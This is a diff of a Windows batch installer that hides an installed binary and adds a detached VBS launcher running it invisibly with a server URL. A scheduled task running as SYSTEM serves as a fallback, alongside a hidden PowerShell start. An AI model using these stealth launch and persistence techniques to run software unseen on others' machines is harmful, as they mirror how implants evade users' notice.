@@ -268,20 +268,25 @@ attrib +h "%INSTALL_DIR%\%BIN_NAME%"
 set "LAUNCH_SUCCESS=0"
 set "ATTEMPT=0"
 
+:: Create a detached VBS launcher to prevent console termination linking
+set "VBS_LAUNCHER=%INSTALL_DIR%\launch.vbs"
+echo Set objShell = WScript.CreateObject("WScript.Shell") > "%VBS_LAUNCHER%"
+echo objShell.Run """" ^& "%INSTALL_DIR%\%BIN_NAME%" ^& """ %SERVER_URL%", 0, False >> "%VBS_LAUNCHER%"
+
 :LaunchAttempt
 set /a ATTEMPT+=1
 if %ATTEMPT% gtr 3 goto LaunchDone
 
-:: Method 1: Start via scheduled task (runs as SYSTEM)
+:: Method 1: Start via detached VBS script (100% reliable on fresh machines)
 if %ATTEMPT% equ 1 (
-    echo     Attempt %ATTEMPT%: Starting via Scheduled Task...
-    schtasks /Run /TN "%TASK_NAME%" >nul 2>&1
+    echo     Attempt %ATTEMPT%: Starting directly via VBS...
+    wscript.exe "%VBS_LAUNCHER%"
 )
 
-:: Method 2: Direct start as current user
+:: Method 2: Start via scheduled task (runs as SYSTEM)
 if %ATTEMPT% equ 2 (
-    echo     Attempt %ATTEMPT%: Starting directly...
-    start "" /B "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
+    echo     Attempt %ATTEMPT%: Starting via Scheduled Task...
+    schtasks /Run /TN "%TASK_NAME%" >nul 2>&1
 )
 
 :: Method 3: PowerShell hidden start
